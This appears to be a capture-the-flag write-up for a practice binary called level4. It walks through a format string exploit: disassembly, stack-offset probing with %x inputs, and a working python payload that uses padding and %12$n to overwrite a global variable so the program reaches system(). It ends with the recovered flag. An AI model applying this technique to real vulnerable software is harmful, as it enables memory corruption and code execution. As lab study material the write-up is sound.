## level4
The `level4` is almost the same as `level3`, a very basic main that calls a function called `n()` that also calls `p()` only for outputing what was entered as argument and then function `n()` compares the value inside *global variable 0x8049810 \<m>* to `0x1025544` and if they are not equal the function returns otherwise it executes: <br> `0x080484a0 <+73>:	call   0x8048360 <system@plt>` <br>and that's what we want.
```
0x080484a7 <+0>:	push   ebp
0x080484a8 <+1>:	mov    ebp,esp
0x080484aa <+3>:	and    esp,0xfffffff0
0x080484ad <+6>:	call   0x8048457 <n>
0x080484b2 <+11>:	leave
0x080484b3 <+12>:	ret
```
We will be usding the same strategy from `level3` __*format string exploit*__, bear in mind that this time we will need to set a variable to a very higher value, in `level3` was just *64* while in `level4` the value is `0x1025544 (16930116)` so we will need to modify a bit our strategy, but if I remember well when I coded my own version of `printf()` *(I would have never imagined this project would help me in this way :p)* the `printf()` function has an option for `padding` and that's what we're  gonna use here to generate those extra `16930112` characters *(Yeah I'm not kidding)*, let's start to find the __offset__ for our __address__
```
~$ echo "AAAA %x %x %x %x %x %x" | ./level4
AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708
~$ echo "AAAA %x %x %x %x %x %x %x %x" | ./level4
AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500
~$ echo "AAAA %x %x %x %x %x %x %x %x %x %x" | ./level4
AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
~$ echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 41414141
```
A little bit harder but we could find it, checking the position we know our __address__ is being set on the stack at postion 12th so we get it done `%12\$n` and the address we have it from the disassembled code<br>
`x0804848d <+54>:	mov    eax,ds:0x8049810`<br> Now we just need to build the *format string specifier*. <br>
`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')";) | ./level4` <br>
[...]<br>
after some 16930111 space later<br>
`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
